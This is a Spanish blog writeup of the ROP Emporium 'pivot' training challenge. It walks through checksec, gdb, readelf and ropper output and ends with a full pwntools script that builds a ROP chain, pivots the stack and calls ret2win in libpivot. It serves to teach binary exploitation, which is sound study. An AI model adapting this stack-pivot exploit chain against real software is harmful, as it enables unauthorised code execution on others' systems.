---
layout: post
title: Pivot ROP Emporium (x86_64)
comments: true
categories: [Pwn, Writeups, ROPEmporium]
---

Este es el penúltimo post de la serie de writeups de [ROP Emporium](https://ropemporium.com/challenge/split.html). Con esta serie de posts hemos aprendido sobre una de las técnicas más utilizadas en la explotación de binarios, la [***ROP***]({% post_url 2024-08-15-ROP %}), ó *Return Orineted Programming* (Programación orientada a *return*).

En este penúltimo reto, daremos nuestros primeros pasos en las técnicas de *ROP Avanzado*, en este caso, en el *stack pivoting*.

# Reconocimiento

Como siempre comenzamos lanzando *checksec*:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

## Objetivo

Al igual que en el resto de ejercicios, tendremos que utilizar técnicas de [***ROP***]({% post_url 2024-08-15-ROP %}). En este caso, se nos dice que en la biblioteca *libpivot*,  hay una función *ret2win* a la que debemos llamar.

También se nos dice que *ret2win* no está importada, pero sí la función *foothold_function*, que podemos buscar en la **PLT** y añadirle el offset hasta *ret2win*. Hay que tener en cuenta que no se llama a *foothold_function* en ningún momento, por lo que debemos llamarla para actualizar su entrada.

![Image]({{ site.baseurl }}/images/posts/2024-08-25-Pivot_ROP_Emporium-1.png)
![Image]({{ site.baseurl }}/images/posts/2024-08-25-Pivot_ROP_Emporium-2.png)

## Analizando nuestros inputs

Al ejecutar, se nos permite introducir dos outputs y se nos da la siguiente información: `The Old Gods kindly bestow upon you a place to pivot: 0x7ffff77fff10`, además nos dice que el primero irá a dicha dirección.

Si analizamos con *gdb-pwndbg*:

```
0x00000000004006a0  _init
0x00000000004006d0  free@plt
0x00000000004006e0  puts@plt
0x00000000004006f0  printf@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  foothold_function@plt
0x0000000000400730  malloc@plt
0x0000000000400740  setvbuf@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x00000000004008f1  pwnme
0x00000000004009a8  uselessFunction
0x00000000004009bb  usefulGadgets
0x00000000004009d0  __libc_csu_init
0x0000000000400a40  __libc_csu_fini
0x0000000000400a44  _fini
```

```
0x40095d <pwnme+108>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffff77fff10 ◂— 0
        nbytes: 0x100
```

Parece que es cierto, y que el input es de `0x100` bytes. También podemos ver a dónde va el segundo input:

```
0x400996 <pwnme+165>             call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7fffffffdca0 ◂— 0
        nbytes: 0x40
```

En este caso el input es de `0x40` bytes. Si nos fijamos en el stack:

```
─────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ rsp     0x7fffffffdc90 ◂— 0
01:0008│-028     0x7fffffffdc98 —▸ 0x7ffff77fff10 ◂— 0xa616161 /* 'aaa\n' */
02:0010│ rax rsi 0x7fffffffdca0 ◂— 0
... ↓            3 skipped
06:0030│ rbp     0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 1
07:0038│+008     0x7fffffffdcc8 —▸ 0x4008cc (main+133) ◂— mov qword ptr [rbp - 0x10], 0
```

Vemos que la dirección que guarda la dirección de retorno es la `0x7fffffffdcc8`, lo que nos deja una diferencia de 40, o sea 24 B para nuestro payload.

## Buscando en la PLT

En *uselessFunction* encontramos información de la dirección de *foothold_function* en la **PLT**:

```uselessFunction
0x00000000004009a8 <+0>:	push   rbp
0x00000000004009a9 <+1>:	mov    rbp,rsp
0x00000000004009ac <+4>:	call   0x400720 <foothold_function@plt>
0x00000000004009b1 <+9>:	mov    edi,0x1
0x00000000004009b6 <+14>:	call   0x400750 <exit@plt>
```

Ahora miraremos la librería *libpivot* con *readelf*:

```
readelf -a libpivot.so
[...]
48: 0000000000000a81   146 FUNC    GLOBAL DEFAULT   12 ret2win
49: 0000000000000b14     0 FUNC    GLOBAL DEFAULT   13 _fini
50: 000000000000097d    26 FUNC    GLOBAL DEFAULT   12 void_function_01
51: 00000000000009b1    26 FUNC    GLOBAL DEFAULT   12 void_function_03
52: 00000000000009e5    26 FUNC    GLOBAL DEFAULT   12 void_function_05
53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fgets@@GLIBC_2.2.5
54: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
55: 000000000000096a    19 FUNC    GLOBAL DEFAULT   12 foothold_function
[...]
```

Por tanto el **offset** entre *ret2win* y *foothold_function* será `0x117`.

```bash
readelf -a libpivot.so
[...]
Relocation section '.rela.plt' at offset 0x5c8 contains 9 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000601018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
000000601020  000200000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000601028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 printf@GLIBC_2.2.5 + 0
000000601030  000400000007 R_X86_64_JUMP_SLO 0000000000000000 memset@GLIBC_2.2.5 + 0
000000601038  000500000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000601040  000800000007 R_X86_64_JUMP_SLO 0000000000000000 foothold_function + 0
000000601048  000900000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
000000601050  000a00000007 R_X86_64_JUMP_SLO 0000000000000000 setvbuf@GLIBC_2.2.5 + 0
000000601058  000b00000007 R_X86_64_JUMP_SLO 0000000000000000 exit@GLIBC_2.2.5 + 0
[...]
```

En el caso del binario, la entrada de la **GOT** de *foothold_function* es `000000601040`.

# Explotación

Para este reto utilizaremos una técnica llamada [[Stack pivoting]]. Ya que disponemos de los gadgets necesarios para ello:

```bash
ropper -f pivot --stack-pivot
[...]
Gadgets
=======
0x00000000004009be: xchg esp, eax; ret;
0x00000000004009bd: xchg rsp, rax; ret;
```

```
0x00000000004009bb: pop rax; ret;
```

## Resumen

Tenemos que llamar a *ret2win*:

1. Primero llamaremos a *foothold_function* para actualizar su entrada de la *.got.plt*.
2. Cargamos la dirección de *foothold_function*, primero desde la *.got* y luego resolvemos esa dirección para tener la efectiva.
3. Añadimos el offset entre *ret2win* y *foothold_function* a la dirección que hemos cargado.
4. Llamamos a dicha dirección.

## Buscando los gadgets necesarios

Utilizando *ropper* encontramos los gadgets que utilizaremos:

```
0x00000000004006b0: call rax;
0x00000000004009c4: add rax, rbp; ret;
0x00000000004007c8: pop rbp; ret;
0x00000000004009c0: mov rax, qword ptr [rax]; ret;
```

## Script

Ya podemos crear un script en *python* utilizando *pwntools*:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

context.update(arch='amd64')
exe = './pivot'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        exit()
    else:
        return process([exe] + argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

# Leer la dirección de pivot del output del binario
io.recvuntil(b':')
pivot_address = io.recvline().strip()  # Capturar la línea con la dirección
pivot_address = int(pivot_address, 16)  # Convertirla de cadena hexadecimal a número

log.info(f'Pivot address: {hex(pivot_address)}')    #DEBUG

offset = b'A'*40
addr_offset = p64(0x117)    # PLT offset
addr = p64(pivot_address)  # 1st input destination
foothold_plt = p64(0x400720)    # Obtained from uselessFunct
foothold_got = p64(0x601040)    # Obtained from readelf

xchgrax_rsp_ret = p64(0x4009bd)
poprax_ret = p64(0x4009bb)
add_rax_rbp_ret = p64(0x4009c4)
poprbp_ret = p64(0x4007c8)
movrax_addrrax_ret = p64(0x4009c0)
call_rax = p64(0x4006b0)

# LOAD PAYLOAD IN 1ST INPUT

payload = foothold_plt               # call foothold_plt first
payload += poprax_ret                # get the adress of foothold_got into rax
payload += foothold_got
payload += movrax_addrrax_ret        # get the effective adress of foothold_got into rax
payload += poprbp_ret                # get the offset into rbp
payload += addr_offset
payload += add_rax_rbp_ret           # add the offset to get the address of ret2win 
payload += call_rax                  # call ret2win

io.recvuntil(b'> ')
io.sendline(payload)

# MAKE STACK PIVOTING IN SECOND INPUT

stack_pivoting = offset
stack_pivoting += poprax_ret
stack_pivoting += addr
stack_pivoting += xchgrax_rsp_ret
io.recvuntil(b'> ')
io.sendline(stack_pivoting)


io.interactive()
```

Hay que tener en cuenta que el valor de la dirección a la que pivotar va variando, por lo que hay que capturarlo al ejecutar el binario.

Y ya sólo nos quedaría un último post de esta serie de post. Sin más preámbulo, ¡Nos vemos en el siguiente post!